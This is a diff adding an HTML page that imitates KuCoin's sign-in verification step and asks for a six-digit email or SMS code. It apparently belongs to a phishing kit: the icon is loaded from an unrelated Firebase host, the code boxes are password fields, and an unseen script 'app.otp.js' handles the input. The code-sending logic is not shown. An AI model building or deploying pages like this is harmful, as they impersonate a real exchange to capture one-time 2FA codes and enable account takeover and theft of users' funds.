@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Sign in to KuCoin and start trading cryptocurrencies."
+    />
+    <link rel="apple-touch-icon" href="/kucoin-base-web/img/logo/512.png" />
+    <link rel="icon" href="/logo.png" />
+    <link
+      rel="shortcut icon"
+      href="https://younk-5b894.web.app/images/logo.png"
+      type="image/x-icon"
+    />
+    <title>KuCoin: Log In | Sign In</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="/css/otp.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="wrapper">
+        <div class="tab_box">
+          <div class="tab_btn activeBar" onclick="toggleTab('email')">
+            Email
+          </div>
+          <div class="tab_btn two" onclick="toggleTab('phone')">
+            Text Message
+          </div>
+        </div>
+
+        <div class="content_box active" id="emailContent">
+          <div class="title">
+            Please enter the 6-digit verification code sent to your Email
+          </div>
+          <div class="content">
+            <div class="formSec">
+              <div class="input">
+                <form class="form" method="post">
+                  <input
+                    type="password"
+                    id="digit1"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit2"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit3"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit4"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit5"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit6"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                </form>
+                <a href="#"><div class="subtext">Cannot receive SMS?</div></a>
+                <a href="#"><div class="subtext">Phone unavailiable?</div></a>
+                <a href="#"
+                  ><div class="subtext">Switch verification method</div></a
+                >
+              </div>
+
+              <div class="buttonSec">
+                <button id="emailBtn" type="submit">Submit</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="content_box" id="phoneContent">
+          <div class="title">
+            Please enter the 6-digit verification code sent to your Number
+          </div>
+          <div class="content">
+            <div class="formSec">
+              <div class="input">
+                <form class="form" method="post">
+                  <input
+                    type="password"
+                    id="digit1"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit2"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit3"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit4"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit5"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                  <input
+                    type="password"
+                    id="digit6"
+                    class="pin-input"
+                    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                    inputmode="numeric"
+                    pattern="[0-9]*"
+                  />
+                </form>
+                <a href="#"><div class="subtext">Cannot receive SMS?</div></a>
+                <a href="#"><div class="subtext">Phone unavailiable?</div></a>
+                <a href="#"
+                  ><div class="subtext">Switch verification method</div></a
+                >
+              </div>
+
+              <div class="buttonSec">
+                <button id="phoneBtn" type="submit">Submit</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="/js/app.otp.js"></script>
+  </body>
+</html>
